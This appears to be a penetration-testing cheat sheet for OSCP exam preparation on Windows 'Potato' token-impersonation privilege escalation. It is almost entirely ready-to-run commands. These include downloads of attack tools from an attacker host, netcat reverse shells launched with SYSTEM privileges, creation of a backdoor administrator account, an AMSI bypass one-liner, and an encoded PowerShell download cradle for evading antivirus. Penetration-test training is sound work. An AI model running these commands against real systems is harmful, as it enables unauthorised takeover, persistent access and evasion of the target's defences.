---
tags:
  - Foundational
  - Privilege_Escalation
  - Windows
---

# Token Impersonation - Potato Attacks

resources: [GodPotato](https://github.com/BeichenDream/GodPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG), [SweetPotato](https://github.com/CCob/SweetPotato), [RoguePotato](https://github.com/antonioCoco/RoguePotato), [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)

> [!important] Potato attacks abuse Windows services (DCOM/RPC/Named Pipes) to steal SYSTEM tokens. Requires **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege**.

## Checking for Required Privileges

```powershell
whoami /priv
```

```cmd
whoami /priv | findstr "SeImpersonate SeAssignPrimaryToken"
```

> [!tip] If either privilege is **Enabled**, you can use Potato attacks to escalate to SYSTEM.

## Tool Selection Guide

### Quick Reference

| Tool | Windows Version | Complexity | Success Rate | Notes |
|------|----------------|------------|--------------|-------|
| **GodPotato** | 8-11, Server 2012-2022 | Low | Very High | Try first on modern Windows |
| **PrintSpoofer** | Server 2016-2022, Win10-11 | Low | High | Simple, reliable |
| **JuicyPotatoNG** | Server 2012-2022, Win10-11 | Medium | High | Updated JuicyPotato |
| **SweetPotato** | Multiple versions | Low | High | Auto-selects technique |
| **RoguePotato** | Server 2016-2019, Win10 | High | Medium | Needs attacker machine |
| **SharpEfsPotato** | Server 2016-2022, Win10-11 | Medium | High | Uses EFSRPC |
| **JuicyPotato** | 7-10 pre-1809, Server 2008-2016 | High | Medium | Legacy only, needs CLSID |

### Recommended Try Order

1. **GodPotato** - Most reliable on modern systems
2. **PrintSpoofer** - Simple and effective
3. **JuicyPotatoNG** - Good fallback
4. **SweetPotato** - Auto-selects best method
5. **SharpEfsPotato** - Alternative approach
6. **RoguePotato** - If you can set up listener
7. **JuicyPotato** - Only for legacy systems

## GodPotato

resources: [GodPotato GitHub](https://github.com/BeichenDream/GodPotato)

> [!tip] Newest and most reliable potato. Works on Windows 8-11 and Server 2012-2022. **Try this first!**

### Check Compatibility

```powershell
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild -ge 9200
```

### Download

```powershell
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/GodPotato-NET4.exe','GodPotato.exe')
```

```powershell
iwr -uri http://<KaliIP>/GodPotato-NET4.exe -Outfile GodPotato.exe
```

### Basic Usage

```cmd
GodPotato.exe -cmd "whoami"
```

```cmd
GodPotato.exe -cmd "cmd /c whoami"
```

### Reverse Shell

```cmd
GodPotato.exe -cmd "C:\Windows\Temp\nc.exe <AttackerIP> <Port> -e cmd.exe"
```

```cmd
GodPotato.exe -cmd "cmd /c C:\Windows\Temp\nc.exe <AttackerIP> <Port> -e cmd.exe"
```

### Add User to Administrators

```cmd
GodPotato.exe -cmd "net user hacker Password123! /add"
GodPotato.exe -cmd "net localgroup administrators hacker /add"
```

### Execute PowerShell

```cmd
GodPotato.exe -cmd "powershell -e <Base64EncodedCommand>"
```

## PrintSpoofer

resources: [PrintSpoofer GitHub](https://github.com/itm4n/PrintSpoofer)

> [!info] Abuses Print Spooler service. Works on Server 2016-2022 and Windows 10-11.

### Download

```powershell
iwr -uri http://<KaliIP>/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
```

### Interactive Shell

```cmd
PrintSpoofer.exe -i -c cmd
```

```cmd
PrintSpoofer64.exe -i -c powershell.exe
```

### Reverse Shell

```cmd
PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe <AttackerIP> <Port> -e cmd.exe"
```

### Execute Command

```cmd
PrintSpoofer.exe -c "whoami"
```

```cmd
PrintSpoofer.exe -c "net user hacker Password123! /add && net localgroup administrators hacker /add"
```

## JuicyPotatoNG

resources: [JuicyPotatoNG GitHub](https://github.com/antonioCoco/JuicyPotatoNG)

> [!info] Updated version of JuicyPotato for modern Windows (Server 2012-2022, Win10-11). No CLSID needed!

### Download

```powershell
iwr -uri http://<KaliIP>/JuicyPotatoNG.exe -Outfile JuicyPotatoNG.exe
```

### Basic Usage

```cmd
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
```

### Reverse Shell

```cmd
JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc.exe" -a "<AttackerIP> <Port> -e cmd.exe"
```

### Add User

```cmd
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net user hacker Password123! /add && net localgroup administrators hacker /add"
```

### Write Output to File

```cmd
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\Temp\out.txt"
```

## SweetPotato

resources: [SweetPotato GitHub](https://github.com/CCob/SweetPotato)

> [!tip] Unified toolkit that combines multiple potato techniques and auto-selects the best one. Works across multiple Windows versions.

### Download

```powershell
iwr -uri http://<KaliIP>/SweetPotato.exe -Outfile SweetPotato.exe
```

### Basic Usage

```cmd
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"
```

### Reverse Shell

```cmd
SweetPotato.exe -p C:\Windows\Temp\nc.exe -a "<AttackerIP> <Port> -e cmd.exe"
```

### Specify Technique

```cmd
SweetPotato.exe -e EfsRpc -p C:\Windows\Temp\nc.exe -a "<AttackerIP> <Port> -e cmd.exe"
```

> [!info] Available techniques: EfsRpc, WinRM, TokenSteal

## RoguePotato

resources: [RoguePotato GitHub](https://github.com/antonioCoco/RoguePotato)

> [!warning] Requires setting up a listener on your attacker machine. More complex but works when others fail.

### Prerequisites

> [!important] Requires RPC port 135 to be accessible from target to attacker.

### Setup Socat Redirector [Local]

```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TargetIP>:9999
```

### Execute RoguePotato [Remote]

```cmd
RoguePotato.exe -r <AttackerIP> -e "C:\Windows\Temp\nc.exe <AttackerIP> <Port> -e cmd.exe" -l 9999
```

### With Custom Port

```cmd
RoguePotato.exe -r <AttackerIP> -e "cmd.exe" -l 9999 -p 135
```

## SharpEfsPotato

resources: [SharpEfsPotato GitHub](https://github.com/bugch3ck/SharpEfsPotato)

> [!info] Uses EFSRPC (Encrypting File System Remote Protocol) for impersonation. Works on Server 2016-2022, Win10-11.

### Download

```powershell
iwr -uri http://<KaliIP>/SharpEfsPotato.exe -Outfile SharpEfsPotato.exe
```

### Execute Command

```cmd
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\Temp\output.txt"
```

### Reverse Shell

```cmd
SharpEfsPotato.exe -p C:\Windows\Temp\nc.exe -a "<AttackerIP> <Port> -e cmd.exe"
```

### Execute Binary

```cmd
SharpEfsPotato.exe -p C:\Temp\shell.exe
```

## JuicyPotato (Legacy)

resources: [JuicyPotato GitHub](https://github.com/ohpe/juicy-potato), [CLSID List](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

> [!warning] **Legacy tool** for Windows 7-10 pre-1809 and Server 2008-2016 only. Does NOT work on modern Windows. Requires valid CLSID.

### Check Compatibility

```powershell
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild -lt 17763
```

### Download

```powershell
iwr -uri http://<KaliIP>/JuicyPotato.exe -Outfile JuicyPotato.exe
```

### Common CLSIDs

```plaintext
# Windows 10 Enterprise
{03ca98d6-ff5d-49b8-abc6-03dd84127020}

# Windows Server 2016
{4991d34b-80a1-4291-83b6-3328366b9097}

# Windows Server 2012
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

### Basic Usage

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t *
```

### With CLSID

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a "<AttackerIP> <Port> -e cmd.exe" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

### Test Multiple CLSIDs

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

> [!tip] If one CLSID fails, try others from the [CLSID list](https://github.com/ohpe/juicy-potato/tree/master/CLSID) for your OS version.

## DeadPotato

> [!info] Creates a new local administrator user. Useful when you want persistent access.

### Add New Admin User

```cmd
DeadPotato.exe -newadmin <Username>:<Password>
```

```cmd
DeadPotato.exe -newadmin hacker:Password123!
```

### Verify User Creation

```cmd
net localgroup administrators
```

### Login with New User

```bash
# RDP
xfreerdp3 /u:hacker /p:'Password123!' /v:<TargetIP>

# Evil-WinRM
evil-winrm -i <TargetIP> -u hacker -p 'Password123!'
```

### Using PSCredential

```powershell
$securePassword = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("DOMAIN\hacker", $securePassword)
Start-Process "cmd.exe" -Credential $credential
```

## Complete Workflow Example

### Step 1: Check Privileges

```cmd
whoami /priv
```

> [!info] Look for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` with status **Enabled**.

### Step 2: Identify Windows Version

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

### Step 3: Select Tool

```plaintext
Windows 10/11 or Server 2016+ → GodPotato or PrintSpoofer
Windows 8-10 or Server 2012-2019 → JuicyPotatoNG
Legacy (7-10 pre-1809) → JuicyPotato with CLSID
```

### Step 4: Upload Tool

```powershell
# From attacker machine
python3 -m http.server 80

# On target
iwr -uri http://<AttackerIP>/GodPotato.exe -Outfile GodPotato.exe
```

### Step 5: Execute

```cmd
# Test first
GodPotato.exe -cmd "whoami"

# Get reverse shell
GodPotato.exe -cmd "C:\Windows\Temp\nc.exe <AttackerIP> 4444 -e cmd.exe"
```

### Step 6: Verify SYSTEM

```cmd
whoami
# Output: nt authority\system
```

## Troubleshooting

### Privilege Not Enabled

> [!warning] If `SeImpersonatePrivilege` shows as **Disabled**, you cannot use Potato attacks.

```cmd
whoami /priv | findstr SeImpersonate
```

### Tool Fails to Execute

```cmd
# Try different tool
# GodPotato → PrintSpoofer → JuicyPotatoNG → SweetPotato
```

### Access Denied

> [!tip] Ensure you're running from a writable directory like `C:\Windows\Temp` or `C:\Users\Public`.

```cmd
cd C:\Windows\Temp
GodPotato.exe -cmd "whoami"
```

### Antivirus Detection

> [!important] Potato tools are often flagged by AV. Consider:
> - Disabling AV temporarily (if possible)
> - Using obfuscated versions
> - Encoding payloads

### No Output

> [!tip] Write output to a file instead:

```cmd
GodPotato.exe -cmd "cmd /c whoami > C:\Windows\Temp\out.txt"
type C:\Windows\Temp\out.txt
```

## Defense Evasion

### Disable AMSI

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Encoded PowerShell Payload

```bash
# On Kali
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

```cmd
GodPotato.exe -cmd "powershell -enc <Base64>"
```

## OSCP Exam Tips

> [!warning] In OSCP exam:
> - SeImpersonatePrivilege is a common privilege escalation path
> - GodPotato and PrintSpoofer work on most exam machines
> - Always test with `whoami` first before reverse shell
> - Keep multiple potato tools ready

> [!tip] Quick exam workflow:
> 1. `whoami /priv` - Check for SeImpersonate (30 seconds)
> 2. Upload GodPotato (1 minute)
> 3. Test: `GodPotato.exe -cmd "whoami"` (30 seconds)
> 4. Reverse shell: `GodPotato.exe -cmd "nc.exe <IP> <PORT> -e cmd.exe"` (1 minute)
> 5. Total time: ~3 minutes to SYSTEM
